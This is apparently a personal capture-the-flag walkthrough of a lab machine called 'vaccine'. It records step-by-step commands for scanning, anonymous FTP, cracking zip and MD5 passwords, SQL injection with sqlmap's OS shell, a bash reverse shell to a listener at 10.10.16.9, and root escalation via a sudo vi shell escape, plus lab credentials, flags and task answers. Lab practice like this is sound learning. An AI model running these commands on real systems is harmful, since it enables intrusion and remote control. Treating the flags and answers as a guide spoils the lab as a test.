@@ -1,0 +1,408 @@
+2025-04-21 10:49:16 CDT -- START TIME
+--------------------------------------
+
+|================================================================
+- Name: vaccine
+- IP Address: 10.129.133.196
+- OS: Ubuntu 19.10 / 5.3.0-64-generic /x64
+- Notes: 
+
+//CREDS:
+	backup.zip:741852963
+	//MegaCorp Login: admin:qwerty789
+	//SSH Login: postgres:P@s5w0rd!
+
+//Flags:
+	#User: 		ec9b13ca4d6229cd5cc1e09980965bf7
+	#System: 	dd6e058e814260bc70e9bbdef2715849
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// Tasks
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#1 Besides SSH and HTTP, what other service is hosted on this box?
+	FTP
+
+#2 This service can be configured to allow login with any password for specific username. What is that username?
+	Anonymous
+
+#3 What is the name of the file downloaded over this service?
+	backup.zip
+
+#4 What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
+	zip2john
+
+#5 What is the password for the admin user on the website?
+	qwerty789
+
+#6 What option can be passed to sqlmap to try to get command execution via the sql injection?
+	--os-shell
+
+#7 What program can the postgres user run as root using sudo?
+	vi	
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.129.133.196
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)
+
+echo $ports
+//21,22,80
+
+2025-04-21 11:17:31 CDT -- 
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.16.9
+|      Logged in as ftpuser
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: MegaCorp Login
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+
+2025-04-21 11:19:26 CDT -- 
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2025-04-21 11:25:22 CDT -- 
+-- Add /etc/hosts file entries --
+echo -e "$ip \t vaccine.htb" | sudo tee -a /etc/hosts
+cat /etc/hosts
+
+
+// FTP -- Anonymous
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2025-04-21 11:30:10 CDT -- 
+ftp -a $ip
+
+ftp> ls
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+
+2025-04-21 11:30:39 CDT -- 
+ftp> get backup.zip
+
+ftp> bye
+
+2025-04-21 11:31:14 CDT -- 
+unzip -l backup.zip 
+Archive:  backup.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+     2594  2020-02-03 04:57   index.php
+     3274  2020-02-03 13:04   style.css
+---------                     -------
+     5868                     2 files
+
+unzip backup.zip
+//Need Password
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- John the Ripper --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//NOTE: To un-gunzip rockyou
+// sudo gunzip -d /usr/share/wordlists/rockyou.txt.gz
+
+2025-04-21 11:55:07 CDT -- 
+# ZIP file password
+zip2john backup.zip > hashfile.txt
+
+2025-04-21 12:01:58 CDT -- 
+# Usage
+john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
+
+//741852963        (backup.zip)
+
+2025-04-21 12:04:21 CDT -- 
+john --show hashfile.txt 
+backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+
+2025-04-21 12:08:35 CDT -- 
+unzip backup.zip
+//pass: 741852963
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2025-04-21 12:13:31 CDT -- 
+// index.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+less index.php
+
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+
+<h1 align=center>MegaCorp Login</h1>
+
+//CREDS:
+// admin:2cb42f8734ea607eefed3b70af13bbd3
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- HashCat --
+// Crackin admin password for website
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2025-04-21 13:00:50 CDT -- 
+# Create hashfile
+echo '2cb42f8734ea607eefed3b70af13bbd3' > hashes.cat
+
+#NOTE: Find the format of the hash, if unknown/needed
+hash-identifier '2cb42f8734ea607eefed3b70af13bbd3'
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+2025-04-21 13:01:12 CDT -- 
+# Usage
+hashcat -m 0 -a 0 hashes.cat /usr/share/wordlists/rockyou.txt
+
+//2cb42f8734ea607eefed3b70af13bbd3:qwerty789
+
+//Password
+//admin:qwerty789
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Created a test search
+http://vaccine.htb/dashboard.php?search=test
+
+-- SQLmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2025-04-21 13:54:08 CDT -- 
+//Look for a website that uses a parameter in its URL 
+//Example (?id=1)
+
+url=http://vaccine.htb/dashboard.php?search=test
+
+2025-04-21 14:07:36 CDT -- 
+# Usage
+sqlmap -u $url --batch
+
+#NOTE: If logged in, there may be a cookie you have to add to the scan
+
+//Pulled the PHPSESSID cookie
+is678su4vqons3o2rbq26o8lhp
+
+2025-04-21 14:11:55 CDT -- 
+sqlmap -u $url --cookie="PHPSESSID=is678su4vqons3o2rbq26o8lhp" --batch
+
+//GET parameter 'search' is vulnerable.
+
+---
+
+2025-04-21 14:20:23 CDT -- 
+# List databases
+sqlmap -u $url --cookie="PHPSESSID=is678su4vqons3o2rbq26o8lhp" --batch --dbs
+
+[*] public
+
+# List tables
+sqlmap -u "http://vaccine.htb/dashboard.php?search=test" --cookie="PHPSESSID=is678su4vqons3o2rbq26o8lhp" -D public --tables
+
+Database: public
+[1 table]
++------+
+| cars |
++------+
+
+# List columns
+sqlmap -u "http://vaccine.htb/dashboard.php?search=test" --cookie="PHPSESSID=is678su4vqons3o2rbq26o8lhp" -D public -T cars --columns
+
+Database: public
+Table: cars
+[5 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| engine   | varchar |
+| name     | varchar |
+| type     | varchar |
+| fueltype | varchar |
+| id       | int4    |
++----------+---------+
+
+# Dump data
+sqlmap -u "http://vaccine.htb/dashboard.php?search=test" --cookie="PHPSESSID=is678su4vqons3o2rbq26o8lhp" -D public -T cars --dump
+
+Database: public
+Table: cars
+[10 entries]
++----+--------+---------+----------+----------+
+| id | name   | type    | engine   | fueltype |
++----+--------+---------+----------+----------+
+| 1  | Elixir | Sports  | 2000cc   | Petrol   |
+| 2  | Sandy  | Sedan   | 1000cc   | Petrol   |
+| 3  | Meta   | SUV     | 800cc    | Petrol   |
+| 4  | Zeus   | Sedan   | 1000cc   | Diesel   |
+| 5  | Alpha  | SUV     | 1200cc   | Petrol   |
+| 6  | Canon  | Minivan | 600cc    | Diesel   |
+| 7  | Pico   | Sed     | 750cc    | Petrol   |
+| 8  | Vroom  | Minivan | 800cc    | Petrol   |
+| 9  | Lazer  | Sports  | 1400cc   | Diesel   |
+| 10 | Force  | Sedan   | 600cc    | Petrol   |
++----+--------+---------+----------+----------+
+
+
+2025-04-21 14:33:12 CDT -- 
+sqlmap -u "http://vaccine.htb/dashboard.php?search=test" --cookie="PHPSESSID=dtk6888f30qvjsgr021iorhsb2" --os-shell
+
+os-shell> id
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert
+
+// SUCCESS!!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RevShell - postgres (Foothold)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2025-04-21 14:42:17 CDT -- 
+# Start Listener
+sudo rlwrap -cAr nc -lvnp 443
+
+2025-04-21 14:44:44 CDT -- 
+# CB
+/bin/bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"
+
+id
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+
+//SUCCESS!!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+-- Upgrade Sh3ll --
+# Python Method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+find / -type f -name "user.txt" 2>/dev/null
+cat /var/lib/postgresql/user.txt
+
+//ec9b13ca4d6229cd5cc1e09980965bf7
+
+2025-04-21 15:33:56 CDT -- 
+sudo -ll
+//Do not know sudo password
+
+We are the user postgres with no know password!
+
+// PrivEsc --postgres
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+cd /var/www/html/
+
+ls
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+
+less dashboard.php
+
+<?php
+        session_start();
+        if($_SESSION['login'] !== "true") {
+          header("Location: index.php");
+          die();
+        }
+        try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+        }
+
+//postgres:P@s5w0rd!
+
+
+2025-04-21 16:10:30 CDT -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" postgres@$ip
+//P@s5w0rd!
+
+id
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+
+sudo -ll
+Sudoers entry:
+    RunAsUsers: ALL
+    Commands:
+        /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+2025-04-21 16:21:43 CDT -- 
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+//Type: ':!/bin/bash'
+
+//OR//
+:set shell=/bin/bash
+:shell
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+//SUCCESS
+
+2025-04-21 16:25:12 CDT -- 
+cat /root/root.txt
+//dd6e058e814260bc70e9bbdef2715849
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2025-04-21 16:33:34 CDT -- COMPLETE
+
